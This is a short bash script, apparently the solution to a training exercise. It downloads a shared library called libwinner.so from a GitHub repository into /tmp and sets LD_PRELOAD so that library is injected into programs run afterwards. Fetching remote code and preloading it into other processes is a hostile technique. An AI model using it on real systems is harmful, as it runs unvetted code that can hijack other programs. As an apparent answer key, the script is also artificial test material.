#!/bin/bash
wget -P /tmp https://github.com/terryyufei/101-make_me_win/raw/main/libwinner.so
export LD_PRELOAD=/tmp/libwinner.so
